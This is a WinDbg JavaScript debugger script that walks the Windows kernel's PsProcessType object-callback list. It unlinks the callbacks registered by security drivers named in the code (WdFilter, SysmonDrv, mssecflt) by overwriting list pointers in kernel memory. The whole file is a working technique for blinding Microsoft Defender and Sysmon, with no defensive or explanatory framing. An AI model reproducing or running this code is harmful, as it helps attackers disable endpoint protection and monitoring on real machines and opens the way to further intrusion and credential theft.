"use strict";

function zeroDefensiveProcessObjectCallbacks() {
    const log = x => host.diagnostics.debugLog(x + "\n");
    const ctl = host.namespace.Debugger.Utility.Control;

    const targets = ["WdFilter", "SysmonDrv", "mssecflt"];

    log("[*] Walking PsProcessType->CallbackList - Unlinking defensive callbacks\n");

    // Step 1 - get _OBJECT_TYPE base from PsProcessType
    let ptrRes = ctl.ExecuteCommand("dqs nt!PsProcessType L1");
    let objTypeBase = "";
    for (let l of ptrRes) {
        let parts = l.trim().split(/\s+/);
        if (parts.length >= 2) {
            objTypeBase = parts[1].replace(/`/g, "");
            break;
        }
    }

    if (!objTypeBase) {
        log("[-] Failed to read PsProcessType");
        return;
    }

    log("[*] _OBJECT_TYPE base: 0x" + objTypeBase);

    // Step 2 - get CallbackList head at base + 0xc8
    let headAddrRes = ctl.ExecuteCommand("? 0x" + objTypeBase + " + 0xc8");
    let headAddr = "";
    for (let l of headAddrRes) {
        let match = l.match(/=\s+([0-9a-f`]+)/i);
        if (match) {
            headAddr = match[1].replace(/`/g, "");
            break;
        }
    }

    log("[*] CallbackList head: 0x" + headAddr);

    // Step 3 - read Flink from head
    let headRes = ctl.ExecuteCommand("dqs 0x" + headAddr + " L1");
    let flink = "";
    for (let l of headRes) {
        let parts = l.trim().split(/\s+/);
        if (parts.length >= 2) {
            flink = parts[1].replace(/`/g, "");
            break;
        }
    }

    log("[*] First Flink: 0x" + flink + "\n");

    // Step 4 - walk the list
    let current = flink;
    let count = 0;
    let maxIter = 64;

    while (count < maxIter) {

        if (current === headAddr) {
            log("[*] Reached list head - done.\n");
            break;
        }

        // Read 8 QWORDs from current entry
        // offset 0x00 = Flink   (index 0)
        // offset 0x08 = Blink   (index 1)
        // offset 0x28 = Pre CB  (index 5)
        // offset 0x30 = Post CB (index 6)
        let dpsRes = ctl.ExecuteCommand("dqs 0x" + current + " L8");
        let lines = [];
        for (let l of dpsRes) {
            let trimmed = l.trim();
            if (trimmed.length > 0) lines.push(trimmed);
        }

        let nextFlink    = "";
        let blink        = "";
        let preCallback  = "";
        let postCallback = "";

        for (let i = 0; i < lines.length; i++) {
            let parts = lines[i].split(/\s+/);
            if (parts.length < 2) continue;

            let val = parts[1].replace(/`/g, "");
            let sym = parts.slice(2).join(" ");
            let display = val + (sym ? " " + sym : "");

            if (i === 0) nextFlink    = val;
            if (i === 1) blink        = val;
            if (i === 5 && !val.startsWith("0000000000000000")) preCallback  = display;
            if (i === 6 && !val.startsWith("0000000000000000")) postCallback = display;
        }

        let callback = preCallback || postCallback || "(none)";
        log("[" + count + "] Entry: 0x" + current + "  Callback: " + callback);

        // Check if target
        let isTarget = false;
        for (let t of targets) {
            if (callback.toLowerCase().indexOf(t.toLowerCase()) !== -1) {
                isTarget = true;
                break;
            }
        }

        if (isTarget) {
            log("    [!] Target found - unlinking entry 0x" + current);

            // blink->Flink = nextFlink  (skip over current)
            ctl.ExecuteCommand("eq 0x" + blink + " 0x" + nextFlink);
            log("    [+] Set blink->Flink (0x" + blink + ") = 0x" + nextFlink);

            // next->Blink = blink  (skip back over current)
            let nextBlinkAddrRes = ctl.ExecuteCommand("? 0x" + nextFlink + " + 0x8");
            let nextBlinkAddr = "";
            for (let l of nextBlinkAddrRes) {
                let match = l.match(/=\s+([0-9a-f`]+)/i);
                if (match) {
                    nextBlinkAddr = match[1].replace(/`/g, "");
                    break;
                }
            }

            ctl.ExecuteCommand("eq 0x" + nextBlinkAddr + " 0x" + blink);
            log("    [+] Set next->Blink (0x" + nextBlinkAddr + ") = 0x" + blink);
            log("    [+] Entry unlinked.\n");
        }

        if (!nextFlink || nextFlink === "0000000000000000") break;
        current = nextFlink;
        count++;
    }

    log("[*] Done. " + count + " entries walked.");
}

function initializeScript() {
    return [
        new host.functionAlias(zeroDefensiveProcessObjectCallbacks, "zeroDefensiveProcessObjectCallbacks")
    ];
}
